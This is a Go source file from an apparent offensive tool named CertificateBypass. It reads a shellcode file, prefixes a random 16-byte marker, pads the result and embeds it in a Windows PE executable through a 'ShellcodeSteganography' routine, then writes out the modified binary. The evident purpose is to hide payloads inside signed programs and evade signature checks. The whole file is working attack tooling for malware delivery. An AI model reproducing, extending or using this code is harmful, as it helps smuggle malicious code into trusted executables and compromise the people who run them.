package CertificateBypass

import (
	"PEi/PE"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"os"
)

func GetHashCode(randByte []byte) []byte {
	var a [16]byte
	var b []byte

	if len(randByte) < 16 {

		fmt.Printf("The length of the entered random number is %d and is less than 16 digits. A random number will be automatically generated.\n", len(randByte))
		_, err := rand.Read(a[:])
		if err != nil {
			log.Panicf("Random number generation exception %s", err)
		}
		for _, i := range a {
			b = append(b, i)
		}
		encodedStr := hex.EncodeToString(b)
		fmt.Printf("The value of the 16-bit random number is: %v\n", encodedStr)
		return b
	} else {

		encodedStr := hex.EncodeToString(randByte)
		fmt.Printf("The value of the 16-bit random number is: %v\n", encodedStr)
		return randByte
	}
}

func GetShellCode(codeName string, randByte []byte) []byte {
	ShellBytes, err := os.ReadFile(codeName)
	if err != nil {
		log.Panicf("Read File %s Err %s", codeName, err)
	}
	fmt.Printf("The length of the shellcode is: %v\n", len(ShellBytes))
	HashCode := GetHashCode(randByte)
	NewShellBytes := append(HashCode, ShellBytes...)
	WeNeedZero := 8 - len(NewShellBytes)%8
	for i := 0; i < WeNeedZero; i++ {
		NewShellBytes = append(NewShellBytes, 0x00)
	}
	return NewShellBytes
}

func JudgmentProcessor(fileBytes []byte, AddressOfNewExeHeader uint32) PE.Editor {
	var editor PE.Editor
	Machine := fileBytes[AddressOfNewExeHeader+uint32(0x18) : AddressOfNewExeHeader+uint32(0x18)+uint32(0x02)]
	if Machine[0] == 0x0B && Machine[1] == 0x02 {
		editor = PE.X64{FileBytes: fileBytes, AddressOfNewExeHeader: AddressOfNewExeHeader}
	} else if Machine[0] == 0x0B && Machine[1] == 0x01 {
		editor = PE.X86{FileBytes: fileBytes, AddressOfNewExeHeader: AddressOfNewExeHeader}
	}
	return editor
}

func Run(filename string, outname string, shellcode string, randByte []byte) {
	fileBytes, err := os.ReadFile(filename)
	if err != nil {
		log.Panicf("Read File %s Err %s", filename, err)
	}
	AddressOfNewExeHeader := PE.GetAddressOfNewExeHeader(fileBytes)
	ShellBytes := GetShellCode(shellcode, randByte)
	editor := JudgmentProcessor(fileBytes, AddressOfNewExeHeader)
	fileBytes = editor.ShellcodeSteganography(ShellBytes)
	os.WriteFile(outname, fileBytes, 0644)
}
